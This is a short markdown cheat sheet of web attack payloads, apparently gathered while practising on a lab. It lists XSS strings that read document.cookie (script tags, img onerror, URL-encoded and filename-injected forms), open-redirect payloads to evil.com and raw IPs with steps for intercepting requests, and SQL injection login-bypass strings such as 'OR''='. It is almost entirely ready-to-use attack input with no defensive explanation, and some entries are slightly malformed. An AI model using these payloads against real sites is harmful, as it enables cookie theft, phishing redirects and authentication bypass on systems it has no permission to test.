# payload-list
```
######################
XXS PAYLOADS
######################
<script>alert(document.URL)</script>

"><<script>alert(document.cookie)</script>

<script>alert(document.URL)</script>yes@gmail.com

"><h1/onmouseover='\u0061lert(document.URL)'>yesspider

"><img src=x onerror=alert(document.cookie)>

"><h1/onmouseover='\u0061lert(document.URL)'>%00

Payload  = <script>alert(document.cookie)</script>



URL encode =  %20%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3c%2f%73%63%72%69%70%74%3e

In file name = “xxs.txt<img src=x onerror=alert(document.cookie)>”



DOM XSS:===

Payload  =  ?name=<img src=x onerror=alert=(document.cookie) >

PUT this payload after the URL and see that it gives you a popup.





################################

OPEN REDIRECT PYALOAD

################################



change the “open_redirect_1.php” to payload

payload = //evil.com


X-Forwarded-Host: evil.com//


Intercept the request and  put  payload after “&url=open_redirect_4_dashboard.php” 

payload = ///evil.com


Intercept the request and  put  payload after “&url=open_redirect_6_dashboard.php” 

payload = @evil.com


Intercept the request and  put  payload after “&url=open_redirect_7_dashboard.php” 

payload = &url=open_redirect_7_dashboard.php@8.8.8.8


Intercept the request and  put  payload after “&url=” 

payload = 66.96.146.129


####################################
SQL INJECION
####################################


'OR''='

' OR '*'='*

")or("1")=("1

'=0--+
```
